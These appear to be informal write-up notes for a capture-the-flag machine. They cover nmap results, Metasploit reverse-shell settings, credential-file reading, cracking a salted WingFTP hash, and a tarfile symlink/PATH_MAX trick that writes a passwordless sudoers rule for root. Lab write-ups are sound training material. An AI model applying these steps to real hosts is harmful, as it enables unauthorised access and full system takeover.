
**findings** 

```
nmap -sV 10.129.244.106
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-08 11:28 +0530
Nmap scan report for wingdata.htb (10.129.244.106)
Host is up (0.83s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.66
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

the ssh and http port are open


```
set RHOSTS ftp.wingdata.htb
set RPORT 80
set LHOST tun0
set LPORT 4444
exploit
python3 -c 'import pty; pty.spawn("/bin/bash")'
```


these  are the commands to gain the reverse shell , in msfconsole

----------

After got the reverse shell , first thing is to `cat etc/passwd` it shows the real username where we need to take-over , but there is  no password they given for the wacky , so in the directory `cat Data/1/users/wacky.xml`  the password hash taken , when i blindly to crack the hash , so i couldn't , so i check how the WingFTP server password hash are stored , so it storing like the 
`hash:Salt` so --> hash:WingFTP , it decrypt and give the password , after the we can log in into the wacky user and then we need to log in into the root 

![[Pasted image 20260409092546.png]]


so in the dir python3 , and the using the .py file if we run in  the form of the sudo , can can run as root without the root password , but

```
filter="data" checks:
❌ Absolute symlinks  (/root/root.txt)     BLOCKED
❌ Path traversal     (../../../../etc)    BLOCKED
✅ Relative symlinks  within staging dir   ALLOWED

We kept trying simple path traversal
but filter="data" caught it every time!
```


```
The trick is PATH_MAX = 4096 characters limit!

Linux can only resolve paths up to 4096 characters
When path is TOO LONG, os.path.realpath() GIVES UP
and stops checking if path escapes the staging dir!

This script creates paths SO LONG that the security
check gets confused and allows the escape! 🤯
```


```
Creates directories with 247 character names:
ddddddd...ddd/     (247 chars)
ddddddd...ddd/ddddddd...ddd/
ddddddd...ddd/ddddddd...ddd/ddddddd...ddd/

And short symlinks pointing to them:
a → ddddddd...ddd
b → ddddddd...ddd
c → ddddddd...ddd

So path a/b/c/d... looks short
but resolves to a VERY LONG path!
```

```
"escape" → points through pivot → goes ../../../
Python's realpath() runs OUT OF SPACE to check
It STOPS checking and ASSUMES path is safe!

Result: "escape" resolves to "/" (filesystem root!)
```

```
escape/sudoers.d/wacky
      ↓
resolves to
      ↓
/etc/sudoers.d/wacky  ← ROOT owned directory!

Contents written:
"wacky ALL=(ALL) NOPASSWD: ALL"
```

```
BEFORE attack:
━━━━━━━━━━━━━
/etc/sudoers.d/   ← only root's rules
wacky has NO sudo access
sudo su → asks password → DENIED

AFTER attack:
━━━━━━━━━━━━
/etc/sudoers.d/wacky contains:
"wacky ALL=(ALL) NOPASSWD: ALL"
         ↑           ↑
    any command   no password needed!

sudo reads this file →
wacky can run ANYTHING as root
WITHOUT password!

sudo su → switches to root → NO PASSWORD! 🎉
```


